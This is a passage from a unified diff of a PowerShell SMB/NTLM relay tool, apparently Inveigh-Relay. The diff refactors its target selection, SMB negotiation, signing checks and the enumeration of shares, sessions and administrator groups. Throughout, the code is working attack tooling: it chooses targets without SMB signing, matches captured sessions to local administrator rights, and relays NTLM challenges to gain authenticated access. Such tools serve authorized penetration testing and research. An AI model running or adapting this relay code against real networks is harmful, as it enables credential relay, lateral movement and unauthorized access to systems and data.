-                        $packet_SMB_header = New-PacketSMBHeader 0x72 0x18 0x01,0x48 0xff,0xff $ProcessID 0x00,0x00       
-                        $packet_SMB_data = New-PacketSMBNegotiateProtocolRequest $SMB_version
-                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
-                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
-                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
-                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
-                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
-                        $client_stream.Write($client_send,0,$client_send.Length) > $null
-                        $client_stream.Flush()    
-                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
-
-                        if([System.BitConverter]::ToString($client_receive[4..7]) -eq 'ff-53-4d-42')
-                        {
-                            $SMB2 = $false
-                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Negotiated SMB1 not supported") > $null
-                            $inveigh.output_queue.Add("[*] [$(Get-Date -format s)] Trying anonther target") > $null
-                            $client.Close()
-                            $stage = 'Exit'
-                        }
-                        else
-                        {
-                            $SMB2 = $true
-                            $stage = 'NegotiateSMB2'
-                        }
-
-                        if($target -and [System.BitConverter]::ToString($client_receive[70]) -eq '03')
-                        {        
-                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Signing is required on $target") > $null
-                            $inveigh.output_queue.Add("[*] [$(Get-Date -format s)] Trying another target") > $null
-                            $signing = $true
-                            $client.Close()
-                            $stage = 'Exit'
-                        }
-                        else
-                        {
-                            $signing = $false    
-                        }
-
-                    }
-                    
-                    'NegotiateSMB2'
-                    { 
-                        $tree_ID = 0x00,0x00,0x00,0x00
-                        $session_ID = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
-                        $message_ID = 1
-                        $packet_SMB2_header = New-PacketSMB2Header 0x00,0x00 0x00,0x00 $false $message_ID $ProcessID $tree_ID $session_ID  
-                        $packet_SMB2_data = New-PacketSMB2NegotiateProtocolRequest
-                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
-                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
-                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
-                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
-                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
-                        $client_stream.Write($client_send,0,$client_send.Length) > $null
-                        $client_stream.Flush()    
-                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
-                        $stage = 'Exit'
-                        $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Grabbing challenge for relay from $target") > $null
-                    }
                 
+                    switch ($stage)
+                    {
+
+                        'NegotiateSMB'
+                        {
+                            $packet_SMB_header = New-PacketSMBHeader 0x72 0x18 0x01,0x48 0xff,0xff $ProcessID 0x00,0x00       
+                            $packet_SMB_data = New-PacketSMBNegotiateProtocolRequest $SMB_version
+                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
+                            $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
+                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
+                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
+                            $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
+                            $client_stream.Write($client_send,0,$client_send.Length) > $null
+                            $client_stream.Flush()    
+                            $client_stream.Read($client_receive,0,$client_receive.Length) > $null
+
+                            if([System.BitConverter]::ToString($client_receive[4..7]) -eq 'ff-53-4d-42')
+                            {
+                                $SMB2 = $false
+                                $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Negotiated SMB1 not supported") > $null
+                                $inveigh.output_queue.Add("[*] [$(Get-Date -format s)] Trying anonther target") > $null
+                                $client.Close()
+                                $stage = 'Exit'
+                            }
+                            else
+                            {
+                                $SMB2 = $true
+                                $stage = 'NegotiateSMB2'
+                            }
+
+                            if($target -and [System.BitConverter]::ToString($client_receive[70]) -eq '03')
+                            {        
+                                $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Signing is required on $target") > $null
+                                $inveigh.output_queue.Add("[*] [$(Get-Date -format s)] Trying another target") > $null
+                                $signing = $true
+                                $client.Close()
+                                $stage = 'Exit'
+                            }
+                            else
+                            {
+                                $signing = $false    
+                            }
+
+                        }
+                        
+                        'NegotiateSMB2'
+                        { 
+                            $tree_ID = 0x00,0x00,0x00,0x00
+                            $session_ID = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
+                            $message_ID = 1
+                            $packet_SMB2_header = New-PacketSMB2Header 0x00,0x00 0x00,0x00 $false $message_ID $ProcessID $tree_ID $session_ID  
+                            $packet_SMB2_data = New-PacketSMB2NegotiateProtocolRequest
+                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
+                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
+                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
+                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
+                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
+                            $client_stream.Write($client_send,0,$client_send.Length) > $null
+                            $client_stream.Flush()    
+                            $client_stream.Read($client_receive,0,$client_receive.Length) > $null
+                            $stage = 'Exit'
+                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Grabbing challenge for relay from $target") > $null
+                        }
+                    
+                    }
+
                 }
-
+                catch
+                {
+                    $error_message = $_.Exception.Message
+                    $error_message = $error_message -replace "`n",""
+                    $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim()) stage $stage") > $null
+                    $stage = 'Exit'
+                }
+            
             }
-
+            
             return $client,$SMB2,$signing
         }
 
         function Test-SMBTarget
         {
-            param([Array]$targets,[Int]$limit)
+            param([Array]$targets,[Int]$limit,[String]$initiator)
 
             $filter_date = Get-Date
-            [Array]$targets_excluded = $inveigh.enumerated_data | Where-Object {$_.IP -eq $SourceIP -or ($_.Targeted -and $_."SMB Server" -and (!$_."SMB2.1" -or $_.Signing)) -or
-                ($_.Targeted -and !$_."SMB Server" -and (New-TimeSpan $_.Targeted $filter_date).Minutes -lt $TargetRefresh)} | Select-Object -expand IP
+
+            for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)
+            {
+
+                if(!$inveigh.enumerate[$i].IP -or $inveigh.enumerate[$i].IP -eq $SourceIP -or $inveigh.enumerate[$i].Signing -or $inveigh.enumerate[$i]."SMB2.1" -eq $false -or 
+                ($inveigh.enumerate[$i]."SMB Server" -eq $false -and (New-TimeSpan $inveigh.enumerate[$i].Targeted $filter_date).Minutes -lt $TargetRefresh))
+                {
+
+                    if($inveigh.enumerate[$i].IP)
+                    {
+                        $targets_excluded += @($inveigh.enumerate[$i].IP)
+                    }
+
+                }
+
+            }
 
             if($targets -and $targets_excluded)
             {
                 $targets = Compare-Object -ReferenceObject $targets -DifferenceObject $targets_excluded -PassThru | Where-Object {$_.SideIndicator -eq "<="}
-
+                $sessions_temp = $inveigh.session
+                
                 if($targets -and $inveigh.relay_history_table.$SourceIP -and
                 (Compare-Object -ReferenceObject $targets -DifferenceObject $inveigh.relay_history_table.$SourceIP | Where-Object {$_.SideIndicator -eq "<="}))
                 {
                     [Array]$targets = Compare-Object -ReferenceObject $targets -DifferenceObject $inveigh.relay_history_table.$SourceIP -PassThru | Where-Object {$_.SideIndicator -eq "<="}
                 }
-                elseif($targets -and ($inveigh.session_list | Where-Object {$_.Status}))
+                elseif($targets -and ($sessions_temp | Where-Object {$_.Status}))
                 {
                     $targets_temp = $targets
                     $targets = @()
                     
-                    ForEach($target_entry in $targets_temp)
+                    foreach($target_entry in $targets_temp)
                     {
-                        $sessions = @($inveigh.session_list | Where-Object {$_.Target -eq $target_entry -and $_.Status -eq 'connected'})
+                        
+                        $sessions = @($sessions_temp | Where-Object {$_.Target -eq $target_entry -and $_.Status -eq 'connected'})
 
-                        if($sessions -and ($sessions.Count -lt $limit -or $inveigh.enumerated_data | Where-Object {$_.IP -eq $target_entry -and $_.Shares}))
+                        if($sessions -and $sessions.Count -lt $limit)
                         {
                             $targets += $target_entry
+                        }
+                        elseif($initiator)
+                        {
+                            $sessions = @($sessions_temp | Where-Object {$_.Target -eq $target_entry -and $_.Initiator -eq $initiator -and $_.Status -eq 'connected'})
+
+                            if($sessions -and $sessions.Count -lt $limit)
+                            {
+                                $targets += $target_entry
+                            }
+
                         }
 
                     }
@@ -2356,9 +2810,9 @@ $SMB_relay_functions_scriptblock =
                     if(!$targets)
                     {
 
-                        ForEach($target_entry in $targets_temp)
+                        foreach($target_entry in $targets_temp)
                         {
-                            $sessions = @($inveigh.session_list | Where-Object {$_.Target -eq $target_entry -and $_.Status -eq 'disconnected'})
+                            $sessions = @($sessions_temp | Where-Object {$_.Target -eq $target_entry -and $_.Status -eq 'disconnected'})
 
                             if($sessions)
                             {
@@ -2403,51 +2857,6 @@ $SMB_relay_functions_scriptblock =
 
                 }
 
-                if($target -and !($target -as [IPAddress]) -as [Bool])
-                {
-
-                    try
-                    {
-                        $IP_list = [System.Net.Dns]::GetHostEntry($target)
-
-                        foreach($entry in $IP_list.AddressList)
-                        {
-
-                            if(!$entry.IsIPv6LinkLocal)
-                            {
-                                $target_IPv4 = $entry.IPAddressToString
-                            }
-                            else
-                            {
-                                $target_IPv6 = $entry.IPAddressToString 
-                            }
-
-                            if($target_IPv4)
-                            {
-                                $target_IPv6 = $null
-                            }
-
-                        }
-
-                        if($target_IPv6)
-                        {
-                            $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] IPv6 target $target not supported") > $null
-                            $target_IPv6 = $null
-                        }
-                        elseif($target_IPv4)
-                        {
-                            $target = $target_IPv4
-                        }
-                                
-                    }
-                    catch
-                    {
-                        $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] DNS lookup for $target failed") > $null
-                        $target = $null
-                    }
-                    
-                }
-
                 if($target -eq $SourceIP)
                 {
                     $target = $null
@@ -2464,11 +2873,22 @@ $SMB_relay_functions_scriptblock =
                         $SMB2 = $SMB_negotiate[1]
                         $signing = $SMB_negotiate[2]
                         $SMB_server = $true
-                        $target_index = $inveigh.enumerated_data | Where-Object {$_.IP -eq $target} | Select-Object -expand Index -First 1
-                        $inveigh.enumerated_data[$target_index]."SMB2.1" = $SMB2
-                        $inveigh.enumerated_data[$target_index].Signing = $signing
-                        $inveigh.enumerated_data[$target_index]."SMB Server" = $SMB_server
-                        $inveigh.enumerated_data[$target_index]."Targeted" = $(Get-Date -format s)
+
+                        for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)
+                        {
+
+                            if($inveigh.enumerate[$i].IP -eq $target)
+                            {
+                                $target_index = $i
+                                break
+                            }
+
+                        }
+
+                        $inveigh.enumerate[$target_index]."SMB2.1" = $SMB2
+                        $inveigh.enumerate[$target_index].Signing = $signing
+                        $inveigh.enumerate[$target_index]."SMB Server" = $SMB_server
+                        $inveigh.enumerate[$target_index]."Targeted" = $(Get-Date -format s)
 
                         if(!$SMB2 -and $signing)
                         {
@@ -2484,42 +2904,29 @@ $SMB_relay_functions_scriptblock =
                 }
                 
             }
-
+            
             return $client,$target
         }
 
-        if($inveigh.target_list.Count -gt 1 -or (!$inveigh.target_list -and $inveigh.enumerated_data))
+        if($inveigh.target_list.Count -gt 1 -or (!$inveigh.target_list -and $inveigh.enumerate))
         {
             $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Searching for a target") > $null
-        }
-
-        if(!($inveigh.enumerated_data | Where-Object {$_.IP -eq $SourceIP}))
-        {
-        
-            try 
-            {
-                $source_hostname = [System.Net.Dns]::GetHostEntry($SourceIP).HostName
-            }
-            catch
-            {
-                $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] DNS reverse lookup for $SourceIP failed") > $null
-            }
-
         }
 
         try
         {
             $targets = $null
             $target = $null
-            $target_hostnames = @()
 
-            if($source_hostname)
+            for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)
             {
-                [Array]$initiator_sessions = $inveigh.enumerated_data | Where-Object {$_.Hostname -eq $source_hostname -and $_.Sessions} | Select-Object -expand Sessions
-            }
-            else
-            {
-                [Array]$initiator_sessions = $inveigh.enumerated_data | Where-Object {$_.IP -eq $SourceIP -and $_.Sessions} | Select-Object -expand Sessions
+
+                if($inveigh.enumerate[$i].IP -eq $SourceIP -and $inveigh.enumerate[$i].Sessions)
+                {
+                    [Array]$initiator_sessions = $inveigh.enumerate[$i].Sessions
+                    break
+                }
+
             }
 
             $initiator_sessions = $initiator_sessions | Sort-Object {Get-Random}
@@ -2528,31 +2935,26 @@ $SMB_relay_functions_scriptblock =
             if($initiator_sessions)
             {
                 
-                ForEach($session in $initiator_sessions)
+                foreach($session in $initiator_sessions)
                 {
-                    $target_hostnames = $inveigh.enumerated_data | Where-Object {$_."Administrator Users" -contains $session -and !$_.IP} | Select-Object -expand Hostname
 
-                    if($target_hostnames)
+                    for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)
+                    {
+
+                        if($inveigh.enumerate[$i]."Administrator Users" -contains $session -and $inveigh.enumerate[$i].IP)
+                        {
+                            $targets += @($inveigh.enumerate[$i].IP)
+                        }
+
+                    }
+
+                    if($targets)
                     {
                         $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Administrator group match found for session $session on:") > $null
                         $inveigh.output_queue.Add(($targets -join ",")) > $null
-                        $SMB_target_results = Test-SMBTarget $target_hostnames $SessionLimitPriv
+                        $SMB_target_results = Test-SMBTarget $targets $SessionLimitPriv
                         $client = $SMB_target_results[0]
                         $target = $SMB_target_results[1]
-                    }
-                    else
-                    {
-                        $targets = $inveigh.enumerated_data | Where-Object {$_."Administrator Users" -contains $session -and $_.IP} | Select-Object -expand IP
-
-                        if($targets)
-                        {
-                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Administrator group match found for session $session on:") > $null
-                            $inveigh.output_queue.Add(($targets -join ",")) > $null
-                            $SMB_target_results = Test-SMBTarget $targets $SessionLimitPriv
-                            $client = $SMB_target_results[0]
-                            $target = $SMB_target_results[1]
-                        }
-
                     }
 
                 }
@@ -2568,8 +2970,9 @@ $SMB_relay_functions_scriptblock =
                     param($session)
 
                     $group_list = @()
+                    $group_table_keys_temp = $inveigh.group_table.keys
 
-                    ForEach($group in $inveigh.group_table.keys)
+                    foreach($group in $group_table_keys_temp)
                     {
 
                         if($inveigh.group_table.$group -contains $session)
@@ -2579,10 +2982,10 @@ $SMB_relay_functions_scriptblock =
 
                     }
 
-                    For($i=0;$i -lt $group_list.Count;$i++)
+                    for($i=0;$i -lt $group_list.Count;$i++)
                     {
                         
-                        ForEach($group in $inveigh.group_table.keys)
+                        foreach($group in $group_table_keys_temp)
                         {
 
                             if($inveigh.group_table.$group -contains $group_list[$i])
@@ -2598,10 +3001,9 @@ $SMB_relay_functions_scriptblock =
                 }
 
                 $session_groups = @()
-                $target_hostnames = @()
                 $targets = @()
 
-                ForEach($session in $initiator_sessions)
+                foreach($session in $initiator_sessions)
                 {
                     $session_groups += Get-SessionGroup $session
                 }
@@ -2609,82 +3011,26 @@ $SMB_relay_functions_scriptblock =
                 if($session_groups)
                 {
 
-                    ForEach($group in $session_groups)
+                    foreach($group in $session_groups)
                     {
-                        $target_hostnames = $inveigh.enumerated_data | Where-Object {$_."Administrator Groups" -contains $group -and !$_.IP} | Select-Object -expand Hostname
-                        
-                        if($target_hostnames)
+
+                        for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)
+                        {
+
+                            if($inveigh.enumerate[$i]."Administrator Groups" -contains $group -and $inveigh.enumerate[$i].IP)
+                            {
+                                $targets += @($inveigh.enumerate[$i].IP)
+                            }
+
+                        }
+
+                        if($targets)
                         {
                             $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Administrator group nested match found for $group from session $session on:") > $null
-                            $inveigh.output_queue.Add(($target_hostnames -join ",")) > $null
-                            $SMB_target_results = Test-SMBTarget $target_hostnames $SessionLimitPriv
+                            $inveigh.output_queue.Add(($targets -join ",")) > $null
+                            $SMB_target_results = Test-SMBTarget $targets $SessionLimitPriv
                             $client = $SMB_target_results[0]
                             $target = $SMB_target_results[1]
-                        }
-                        else
-                        {
-                            $targets = $inveigh.enumerated_data | Where-Object {$_."Administrator Groups" -contains $group -and $_.IP} | Select-Object -expand IP
-
-                            if($targets)
-                            {
-                                $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Administrator group nested match found for $group from session $session on:") > $null
-                                $inveigh.output_queue.Add(($targets -join ",")) > $null
-                                $SMB_target_results = Test-SMBTarget $targets $SessionLimitPriv
-                                $client = $SMB_target_results[0]
-                                $target = $SMB_target_results[1]
-                            }
-
-                        }
-
-                    }
-
-                }
-
-            }
-            
-            # check if mapped netsession match any local admin group members
-            if(!$targets -and !$target)
-            {
-
-                if($source_hostname)
-                {
-                    [Array]$initiator_mapped_net_sessions = $inveigh.enumerated_data | Where-Object {$_.Hostname -eq $source_hostname -and $_."NetSessions Mapped"} | Select-Object -expand "NetSessions Mapped"
-                }
-                else
-                {
-                    [Array]$initiator_mapped_net_sessions = $inveigh.enumerated_data | Where-Object {$_.IP -eq $SourceIP -and $_."NetSessions Mapped"} | Select-Object -expand "NetSessions Mapped"
-                }
-
-                if($initiator_mapped_net_sessions)
-                {
-                    $target_hostnames = @()
-                    $targets = @()
-
-                    ForEach($session in $initiator_mapped_net_sessions)
-                    {
-                        $target_hostnames = $inveigh.enumerated_data | Where-Object {($_."Administrator Users" -like "$session@*" -or $_."Administrator Users" -like "*\$session") -and !$_.IP} | Select-Object -expand Hostname
-
-                        if($target_hostnames)
-                        {
-                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] NetSession user match found for $session on:") > $null
-                            $inveigh.output_queue.Add(($target_hostnames -join ",")) > $null
-                            $SMB_target_results = Test-SMBTarget $target_hostnames $SessionLimitPriv
-                            $client = $SMB_target_results[0]
-                            $target = $SMB_target_results[1]
-                        }
-                        else
-                        {
-                            $targets = $inveigh.enumerated_data | Where-Object {($_."Administrator Users" -like "$session@*" -or $_."Administrator Users" -like "*\$session") -and $_.IP} | Select-Object -expand IP
-
-                            if($targets)
-                            {
-                                $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] NetSession user match found for $session on:") > $null
-                                $inveigh.output_queue.Add(($targets -join ",")) > $null
-                                $SMB_target_results = Test-SMBTarget $targets $SessionLimitPriv
-                                $client = $SMB_target_results[0]
-                                $target = $SMB_target_results[1]
-                            }
-
                         }
 
                     }
@@ -2696,13 +3042,22 @@ $SMB_relay_functions_scriptblock =
             # check if source IP matches any netsessions
             if(!$targets -and !$target -and $SourceIP)
             {
-                $targets = $inveigh.enumerated_data | Where-Object {$_."NetSession" -contains $SourceIP} | Select-Object -expand IP
+
+                for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)
+                {
+
+                    if($inveigh.enumerate[$i].NetSession -contains $SourceIP)
+                    {
+                        $targets += @($inveigh.enumerate[$i].IP)
+                    }
+
+                }
 
                 if($targets)
                 {
                     $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] NetSession IP match found for $SourceIP on:") > $null
                     $inveigh.output_queue.Add(($targets -join ",")) > $null
-                    $SMB_target_results = Test-SMBTarget $target $SessionLimitUnpriv
+                    $SMB_target_results = Test-SMBTarget $targets $SessionLimitUnpriv
                     $client = $SMB_target_results[0]
                     $target = $SMB_target_results[1]
                 }
@@ -2712,13 +3067,22 @@ $SMB_relay_functions_scriptblock =
             # get list of systems with custom shares
             if(!$targets -and !$target)
             {
-                $targets = $inveigh.enumerated_data | Where-Object {$_."Shares"} | Select-Object -expand IP
+
+                for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)
+                {
+
+                    if($inveigh.enumerate[$i].Shares)
+                    {
+                        $targets += @($inveigh.enumerate[$i].IP)
+                    }
+
+                }
                                 
                 if($targets)
                 {
                     $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Searching within the following list of systems hosting custom shares:") > $null
                     $inveigh.output_queue.Add(($targets -join ",")) > $null
-                    $SMB_target_results = Test-SMBTarget $targets $SessionLimitUnpriv
+                    $SMB_target_results = Test-SMBTarget $targets $SessionLimitShare $SourceIP
                     $client = $SMB_target_results[0]
                     $target = $SMB_target_results[1]
                 }
@@ -2737,17 +3101,18 @@ $SMB_relay_functions_scriptblock =
                 else
                 {
                     $targets = @()
+                    $inveigh_enumerate.Count = $inveigh.enumerate.Count
 
-                    foreach($entry in $inveigh.enumerated_data)
+                    for($i=0; $i -lt $hostname_encoded.Count; $i++)
                     {
 
-                        if($entry.Hostname)
+                        if($inveigh_enumerate[$i].Hostname)
                         {
-                            $targets += $entry.Hostname
+                            $targets += $inveigh_enumerate[$i].Hostname
                         }
-                        elseif($entry.IP)
+                        elseif($inveigh_enumerate[$i].IP)
                         {
-                            $targets += $entry.IP
+                            $targets += $inveigh_enumerate[$i].IP
                         }
 
                     }
@@ -2773,7 +3138,7 @@ $SMB_relay_functions_scriptblock =
         {
             $error_message = $_.Exception.Message
             $error_message = $error_message -replace "`n",""
-            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $error_message") > $null
+            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
         }
 
         return $client,$target
@@ -2807,7 +3172,7 @@ $SMB_relay_functions_scriptblock =
         {
             $error_message = $_.Exception.Message
             $error_message = $error_message -replace "`n",""
-            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $error_message") > $null
+            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
         }
 
         return $client_receive
@@ -2819,7 +3184,6 @@ $SMB_relay_functions_scriptblock =
     
         try
         {
-        
             $client_receive = New-Object System.Byte[] 1024
 
             if($client)
@@ -2849,9 +3213,20 @@ $SMB_relay_functions_scriptblock =
             }
             else
             {
-                $target_index = $inveigh.enumerated_data | Where-Object {$_.IP -eq $target} | Select-Object -expand Index -First 1
-                $target_hostname = $inveigh.enumerated_data[$target_index].Hostname
-                $target_DNS_domain = $inveigh.enumerated_data[$target_index]."DNS Domain"
+
+                for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)
+                {
+
+                    if($inveigh.enumerate[$i].IP -eq $target)
+                    {
+                        $target_index = $i
+                        break
+                    }
+
+                }
+
+                $target_hostname = $inveigh.enumerate[$target_index].Hostname
+                $target_DNS_domain = $inveigh.enumerate[$target_index]."DNS Domain"
 
                 if($FailedLoginStrict -eq 'Y' -or ($HTTP_NTLM_domain_string -and ((!$target_hostname -or !$target_DNS_domain) -or ($target_hostname -and $target_DNS_domain -and $target_hostname -ne $target_DNS_domain))))
                 {
@@ -2877,7 +3252,7 @@ $SMB_relay_functions_scriptblock =
         {
             $error_message = $_.Exception.Message
             $error_message = $error_message -replace "`n",""
-            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $error_message") > $null
+            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
             $SMB_relay_failed = $true
         }
 
@@ -2980,13 +3355,23 @@ $SMB_relay_functions_scriptblock =
                                 $privileged_user = $HTTP_username_full
                             }
 
-                            $target_index = $inveigh.enumerated_data | Where-Object {$_.IP -eq $target} | Select-Object -expand Index -First 1
-                            [Array]$privileged_user_list = $inveigh.enumerated_data[$target_index].Privileged
+                            for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)
+                            {
+
+                                if($inveigh.enumerate[$i].IP -eq $target)
+                                {
+                                    $target_index = $i
+                                    break
+                                }
+
+                            }
+
+                            [Array]$privileged_user_list = $inveigh.enumerate[$target_index].Privileged
                             
                             if($privileged_user_list -notcontains $privileged_user)
                             {
                                 $privileged_user_list += $privileged_user
-                                $inveigh.enumerated_data[$target_index].Privileged = $privileged_user_list
+                                $inveigh.enumerate[$target_index].Privileged = $privileged_user_list
                             }
 
                             if($AccessCheck)
@@ -3460,7 +3845,6 @@ $SMB_relay_functions_scriptblock =
 
                     'TreeConnect'
                     {
-                        #$tree_ID = $client_receive[40..43]
                         $tree_ID = 0x00,0x00,0x00,0x00
                         $message_ID++
                         $stage_current = $stage
@@ -3503,7 +3887,7 @@ $SMB_relay_functions_scriptblock =
             {
                 $error_message = $_.Exception.Message
                 $error_message = $error_message -replace "`n",""
-                $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $error_message") > $null
+                $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim()) stage $stage_current") > $null
                 $stage = 'Exit'
             }
 
@@ -3545,16 +3929,16 @@ $SMB_relay_functions_scriptblock =
         $j = 0
         $stage = 'TreeConnect'
         $client_stream = $client.GetStream()
-
+            
         while ($stage -ne 'Exit')
         {
 
             try
             {
-                
+            
                 switch ($stage)
                 {
-            
+        
                     'CloseRequest'
                     {
                         $message_ID++
@@ -4545,7 +4929,7 @@ $SMB_relay_functions_scriptblock =
                             'NetSessEnum'
                             {
 
-                                if([System.BitConverter]::ToString($client_receive[172..175]) -eq '05-00-00-00')
+                                if([System.BitConverter]::ToString($client_receive[172..175]) -eq '05-00-00-00' -or [System.BitConverter]::ToString($client_receive[12..15]) -ne '00-00-00-00')
                                 {
                                     $stage = 'CloseRequest'
                                 }
@@ -4668,7 +5052,7 @@ $SMB_relay_functions_scriptblock =
                                     if($client_receive[76] -ne 92)
                                     {
 
-                                        ForEach($byte in $tree_access_mask)
+                                        foreach($byte in $tree_access_mask)
                                         {
                                             $access_mask = [System.Convert]::ToString($byte,2).PadLeft(8,'0') + $access_mask
                                         }
@@ -4750,7 +5134,6 @@ $SMB_relay_functions_scriptblock =
                                             }
                                             elseif($share_list.Count -gt 0 -and $j -eq $share_list.Count - 1)
                                             {
-                                                #Write-Output $response_object_list | Sort-Object -property Share |Format-Table -AutoSize
                                                 $tree_ID = $tree_IPC
                                                 $stage = 'TreeDisconnect'
                                                 $j++
@@ -4852,7 +5235,7 @@ $SMB_relay_functions_scriptblock =
             {
                 $error_message = $_.Exception.Message
                 $error_message = $error_message -replace "`n",""
-                $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $error_message") > $null
+                $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim()) stage $stage_current") > $null
                 $stage -ne 'Exit'
             }
 
@@ -4889,22 +5272,32 @@ $SMB_relay_functions_scriptblock =
         }
 
         $inveigh.session_message_ID_table[$inveigh.session_count] = $message_ID
-        $target_index = $inveigh.enumerated_data | Where-Object {$_.IP -eq $target} | Select-Object -expand Index -First 1
+
+        for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)
+        {
+
+            if($inveigh.enumerate[$i].IP -eq $target)
+            {
+                $target_index = $i
+                break
+            }
+
+        }
 
         if($EnumerateGroup -eq 'Administrators')
         {
-            $inveigh.enumerated_data[$target_index]."Administrator Users" = $enumerate_group_user_list
-            $inveigh.enumerated_data[$target_index]."Administrator Groups" = $enumerate_group_group_list
+            $inveigh.enumerate[$target_index]."Administrator Users" = $enumerate_group_user_list
+            $inveigh.enumerate[$target_index]."Administrator Groups" = $enumerate_group_group_list
         }
 
-        $inveigh.enumerated_data[$target_index]."Local Users" = $enumerate_user_list
-        $inveigh.enumerated_data[$target_index].Shares = $enumerate_share_list
+        $inveigh.enumerate[$target_index]."Local Users" = $enumerate_user_list
+        $inveigh.enumerate[$target_index].Shares = $enumerate_share_list
         $net_sessions_unique = @()
 
-        ForEach($net_session_entry in $enumerate_netsession_list)
+        foreach($net_session_entry in $enumerate_netsession_list)
         {
 
-            if($inveigh.enumerated_data[$target_index].NetSessions -notcontains $net_session_entry)
+            if($inveigh.enumerate[$target_index].NetSessions -notcontains $net_session_entry)
             {
                 $net_sessions_unique += $net_session_entry
             }
@@ -4912,28 +5305,33 @@ $SMB_relay_functions_scriptblock =
             $net_session_IP = ($net_session_entry.Split("\"))[2]
             $net_session_user = ($net_session_entry.Split("\"))[3]
 
-            if($inveigh.enumerated_data | Where-Object {$_.IP -eq $net_session_IP})
+            for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)
             {
-                $net_session_index = $inveigh.enumerated_data | Where-Object {$_.IP -eq $net_session_IP} | Select-Object -expand Index
 
-                if($net_session_index -and $inveigh.enumerated_data[$net_session_index].NetSessions -notcontains $net_session_user)
+                if($inveigh.enumerate[$i].IP -contains $net_session_IP)
                 {
-                    $inveigh.enumerated_data[$net_session_index]."NetSessions Mapped" += $net_session_user
+                    $net_session_index = $i
+                    break
                 }
 
             }
+
+            if($net_session_index -and $inveigh.enumerate[$net_session_index].NetSessions -notcontains $net_session_user)
+            {
+                $inveigh.enumerate[$net_session_index]."NetSessions Mapped" += $net_session_user
+            }
             else
             {
-                $inveigh.enumerated_data += New-RelayEnumObject -IP $net_session_IP -NetSessionsMapped $net_session_user
+                $inveigh.enumerate.Add((New-RelayEnumObject -IP $net_session_IP -NetSessionsMapped $net_session_user)) > $null
             }
 
         }
 
-        $inveigh.enumerated_data[$target_index].NetSessions += $net_sessions_unique
+        $inveigh.enumerate[$target_index].NetSessions += $net_sessions_unique
         
         if(!$RPC_access_denied)
         {
-            $inveigh.enumerated_data[$target_index].Enumerate = $(Get-Date -format s)
+            $inveigh.enumerate[$target_index].Enumerate = $(Get-Date -format s)
         }
 
     }
@@ -5094,7 +5492,6 @@ $HTTP_scriptblock =
